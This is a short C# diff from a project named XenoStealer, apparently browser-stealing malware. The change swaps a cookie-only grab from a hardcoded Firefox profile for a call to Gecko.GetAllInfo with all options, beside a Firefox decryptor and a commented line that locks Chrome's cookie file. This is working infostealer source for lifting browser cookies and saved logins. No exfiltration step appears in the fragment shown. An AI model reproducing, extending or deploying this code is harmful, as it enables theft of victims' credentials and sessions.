@@ -6,7 +6,6 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 using XenoStealer;
-using XenoStealer.DataExtraction.Browsers;
 
 namespace XenoStealer
 {
@@ -19,7 +18,7 @@ namespace XenoStealer
 
 
             GeckoDecryptor a = new GeckoDecryptor(@"C:\Program Files\Mozilla Firefox");
-            Gecko.GetCookies(@"C:\Users\moom825\AppData\Roaming\Mozilla\Firefox\Profiles\q2pa8ef9.default-release");
+            var t=Gecko.GetAllInfo(DataExtractionStructs.GeckoBrowserOptions.All);
             var y = g;
             //Utils.GetProcessLockingFile(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies", out var asd);
 
